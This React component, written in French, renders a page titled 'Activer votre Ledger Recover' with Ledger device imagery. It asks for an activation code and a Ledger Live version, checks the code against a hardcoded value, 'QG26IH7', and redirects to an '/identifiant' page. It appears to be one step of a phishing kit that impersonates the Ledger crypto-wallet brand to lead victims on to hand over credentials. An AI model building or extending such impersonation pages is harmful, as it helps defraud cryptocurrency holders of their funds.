import React, { useState } from 'react';
import ledgerDevicesImage from '../assets/ledger-devices.png'; // Ton image à gauche
import './Activation.css';

const ActivationForm = () => {
  const [activationCode, setActivationCode] = useState('');
  const [ledgerVersion, setLedgerVersion] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [hasError, setHasError] = useState(false);

  const validCode = 'QG26IH7'; // Ex. Code valide

  const handleSubmit = (e) => {
    e.preventDefault();
    // Vérifie si le code correspond
    if (activationCode === validCode) {
      setErrorMessage('');
      setHasError(false);
      // Redirige vers la page identifiant
      window.location.href = '/identifiant';
    } else {
      // Code faux => affiche l'erreur
      setErrorMessage('Code incorrect. Veuillez réessayer.');
      setHasError(true);
    }
  };

  return (
    <div className="activation-main-block">
      <div className="activation-container">
        {/* Image à gauche */}
        <div className="activation-image-container fade-in-up">
          <img
            src={ledgerDevicesImage}
            alt="Ledger devices"
            className="activation-image"
          />
        </div>

        {/* Formulaire à droite */}
        <div className="activation-form-container fade-in-up">
          <h3>Activer votre Ledger Recover</h3>
          <form onSubmit={handleSubmit}>
            <div className="form-group">
              <label className="input-label"></label>
              <input
                type="text"
                placeholder="Code d'activation*"
                value={activationCode}
                onChange={(e) => setActivationCode(e.target.value)}
                className={`input-field ${hasError ? 'input-error' : ''}`}
                required
              />
              {/* Exemple en dessous du champ */}
              <div className="example-text">Exemple: RN33CX6</div>
            </div>

            <div className="form-group">
              <label className="input-label"></label>
              <input
                type="text"
                placeholder='Version LedgerLive*'
                value={ledgerVersion}
                onChange={(e) => setLedgerVersion(e.target.value)}
                className="input-field"
                required
              />
              {/* Exemple en dessous du champ */}
              <div className="example-text">Exemple: 2.77.8</div>
            </div>

            <div className="form-button-group">
              <button type="submit" className="custom-button">
                Continuer
              </button>
            </div>

            {errorMessage && <p className="error-message">{errorMessage}</p>}
          </form>
        </div>
      </div>
    </div>
  );
};

export default ActivationForm;
